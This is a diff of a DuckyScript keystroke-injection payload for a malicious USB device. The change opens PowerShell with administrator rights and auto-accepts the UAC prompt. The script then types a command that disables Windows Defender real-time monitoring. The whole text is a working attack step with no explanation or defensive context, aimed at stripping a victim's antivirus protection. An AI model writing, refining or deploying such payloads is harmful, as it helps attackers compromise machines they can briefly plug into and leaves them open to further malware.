@@ -1,7 +1,11 @@
 DELAY 800
-GUI r
+GUI
 DELAY 800
-STRING Powershell
+STRING powershell
+DELAY 800
+CTRL-SHIFT ENTER
+DELAY 800
+ALT Y
 DELAY 800
 STRING Set-MpPreference -DisableRealtimeMonitoring $true
 ENTER
